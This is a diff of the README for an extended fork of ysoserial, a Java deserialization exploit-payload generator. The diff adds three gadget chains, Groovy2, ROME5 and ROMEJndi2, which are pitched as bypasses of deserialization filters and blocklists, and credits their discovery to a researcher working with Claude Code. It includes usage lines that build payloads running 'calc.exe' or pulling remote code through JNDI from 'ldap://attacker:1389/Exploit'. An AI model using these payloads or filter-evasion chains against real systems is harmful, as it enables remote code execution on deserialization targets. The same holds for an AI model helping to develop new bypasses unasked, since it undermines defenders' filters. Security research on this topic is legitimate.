@@ -1,7 +1,7 @@
 
 # ysoserial (extended)
 
-Fork of [frohoff/ysoserial](https://github.com/frohoff/ysoserial) with **32+ additional gadget chains** from academic papers (JDD, FLASH, GCMiner), independent research, and automated fuzzer discovery. Focuses on filter-bypass entry points, cross-library evasion, and JDK 17+ compatible sinks.
+Fork of [frohoff/ysoserial](https://github.com/frohoff/ysoserial) with **35+ additional gadget chains** from academic papers (JDD, FLASH, GCMiner), independent research, and automated fuzzer discovery. Focuses on filter-bypass entry points, cross-library evasion, and JDK 17+ compatible sinks.
 
 A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.
 
@@ -21,7 +21,7 @@ Standard deserialization filters (JEP 290, custom `ObjectInputFilter`) typically
 | `TreeBag` | CB3 | CC4-specific class, not in standard filter lists |
 | `LinkedHashSet` | CC12, CC13 †, CC15 | Extends HashSet but class-level filters often miss it |
 | `TreeSet` | Click2, BeanShell2 | Standard JDK class, never blocked in known filters |
-| `BadAttributeValueExpException` | ROME2, Jackson1, Jackson2 | JMX class, not commonly filtered |
+| `BadAttributeValueExpException` | ROME2, Groovy2 ‡, Jackson1, Jackson2 | JMX class, not commonly filtered |
 | `Hashtable` | ROME3 | Some filters miss this older Map implementation |
 
 ### Filter-Bypass Sinks (InvokerTransformer Alternatives)
@@ -34,6 +34,7 @@ Standard deserialization filters (JEP 290, custom `ObjectInputFilter`) typically
 | `CC15` | Same as CC14 + LinkedHashSet root | Double evasion: root + sink bypass |
 | `CC16` ‡ | ConcurrentSkipListMap + `InstantiateTransformer` | Triple evasion: new entry + sink + no LazyMap |
 | `CC17` ‡ | PriorityBlockingQueue + `InstantiateTransformer` | PQ filter bypass + sink bypass |
+| `ROME5` ‡ | PBQ + `StringValueTransformer` → ROME `ToStringBean` | Novel transformer — never in any filter list |
 | `CC13` † | Cross-library CC4→CC3 + InvokerTransformer | Version-specific filters miss cross-library |
 
 ### JDK 17+ Compatible (No TemplatesImpl)
@@ -51,6 +52,7 @@ These chains work without `--add-opens java.xml` by using JNDI sinks instead of 
 | `CommonsBeanutils4` | `JdbcRowSetImpl` → JNDI | CB + PriorityQueue + JNDI sink |
 | `CommonsBeanutilsJndi3` ‡ | `JdbcRowSetImpl` → JNDI | CB + ConcurrentSkipListMap — novel entry, no CC needed |
 | `CommonsBeanutilsJndi4` ‡ | `JdbcRowSetImpl` → JNDI | CB + PriorityBlockingQueue — PQ filter bypass, no CC needed |
+| `ROMEJndi2` ‡ | PBQ + `StringValueTransformer` → JNDI | No InvokerTransformer, no HashMap — novel bridge |
 | `CommonsBeanutilsH2` | `JdbcRowSetImpl` → H2 JDBC INIT | RCE via H2 SQL (requires H2 1.x on target) |
 | `WildFly1` | `InitialContext.lookup()` | Direct JNDI from `readObject()` — 120 bytes |
 
@@ -102,10 +104,13 @@ These bypass first-layer type filters by wrapping an inner payload:
 | `CommonsCollections17` | @dmbs335 ‡ | PriorityBlockingQueue + InstantiateTransformer — PQ filter bypass + sink bypass |
 | `CommonsBeanutils6` | @dmbs335 ‡ | PriorityBlockingQueue + BeanComparator — no CC dependency on target |
 | `CommonsBeanutilsJndi4` | @dmbs335 ‡ | PriorityBlockingQueue + JNDI — JDK 17+, no TemplatesImpl, no CC |
+| `Groovy2` | @dmbs335 ‡ | BAVE + ConvertedClosure(toString) — no HashMap, no AIH, no TemplatesImpl, no CC |
+| `ROME5` | @dmbs335 ‡ | PBQ + StringValueTransformer → ToStringBean — novel toString bridge, no InvokerTransformer |
+| `ROMEJndi2` | @dmbs335 ‡ | PBQ + StringValueTransformer → JNDI — JDK 17+, no InvokerTransformer, no HashMap |
 
 > **†** Discovered by @dmbs335 via automated fuzzing ([web-fuzzer](https://github.com/dmbs335/web-fuzzer), 2026-03-14). CC13 (cross-library CC4+CC3) and CCJndi2 (cross-library JNDI) are novel chains found by type-aware mutation and cross-library chain splicing.
 >
-> **‡** Discovered by @dmbs335 with Claude Code (2026-03-14). CC16, CB5, CBJndi3 use `ConcurrentSkipListMap`; CC17, CB6, CBJndi4 use `PriorityBlockingQueue` — both are `java.util.concurrent` classes never seen in any known gadget chain or filter blocklist. PriorityBlockingQueue shares the same `heapify()→compare()` mechanism as PriorityQueue but has a different class identity, bypassing exact-class-name filters.
+> **‡** Discovered by @dmbs335 with Claude Code (2026-03-14). Novel entry points: CC16/CB5/CBJndi3 use `ConcurrentSkipListMap`, CC17/CB6/CBJndi4 use `PriorityBlockingQueue` — `java.util.concurrent` classes never in any filter blocklist. Novel bridge: ROME5/ROMEJndi2 use `StringValueTransformer` (toString bridge) — a CC4 transformer never seen in any gadget chain, connecting PBQ entry to ROME's ToStringBean without InvokerTransformer. Novel trigger: Groovy2 uses `BadAttributeValueExpException` → `ConvertedClosure("toString")` — completely different entry/trigger/sink from Groovy1.
 
 ### Exploit Tools
 
@@ -114,7 +119,7 @@ These bypass first-layer type filters by wrapping an inner payload:
 | `JRMPListener` | @mbechler | `java -cp ysoserial.jar ysoserial.exploit.JRMPListener <port> <payload> <cmd>` |
 | `RMIRegistryExploit` | @mbechler | `java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit <host> <port> <payload> <cmd>` |
 
-## All Payloads (79 total)
+## All Payloads (82 total)
 
 ```
 Payload                Authors                                Dependencies
@@ -162,6 +167,7 @@ CommonsCollectionsJndi @mbechler                              commons-collection
 CommonsCollectionsJndi2 @dmbs335 †                            commons-collections:3.1, commons-collections4:4.0
 FileUpload1            @mbechler                              commons-fileupload:1.3.1, commons-io:2.4
 Groovy1                @frohoff                               groovy:2.3.9
+Groovy2                @dmbs335 ‡                             groovy:2.3.9
 GroovyGStr             @frohoff                               groovy:2.4.3
 Hibernate1             @mbechler                              hibernate-core:4.3.11.Final
 Hibernate2             @mbechler                              hibernate-core:4.3.11.Final
@@ -185,7 +191,9 @@ ROME                   @mbechler                              rome:1.0
 ROME2                  @mbechler                              rome:1.0
 ROME3                  @mbechler                              rome:1.0
 ROME4                  @mbechler                              rome:1.0
+ROME5                  @dmbs335 ‡                             commons-collections4:4.0, rome:1.0
 ROMEJndi               @mbechler                              rome:1.0
+ROMEJndi2              @dmbs335 ‡                             commons-collections4:4.0, rome:1.0
 Scala                  @mbechler                              scala-library:2.12.6
 SignedObjectWrap       @su18                                  commons-beanutils:1.9.2
 Spring1                @frohoff                               spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE
@@ -267,6 +275,13 @@ java -jar ysoserial.jar CommonsBeanutilsJndi3 'ldap://attacker:1389/Exploit' > p
 java -jar ysoserial.jar CommonsCollections17 'calc.exe' > payload.bin
 java -jar ysoserial.jar CommonsBeanutils6 'calc.exe' > payload.bin
 java -jar ysoserial.jar CommonsBeanutilsJndi4 'ldap://attacker:1389/Exploit' > payload.bin
+
+# Groovy via BAVE + toString — no HashMap, no AIH, no TemplatesImpl, no CC
+java -jar ysoserial.jar Groovy2 'calc.exe' > payload.bin
+
+# ROME via PBQ + StringValueTransformer — no InvokerTransformer, no HashMap
+java -jar ysoserial.jar ROME5 'calc.exe' > payload.bin
+java -jar ysoserial.jar ROMEJndi2 'ldap://attacker:1389/Exploit' > payload.bin
 
 # Nested wrapper to bypass first-layer type filters
 java -jar ysoserial.jar SignedObjectWrap 'calc.exe' > payload.bin
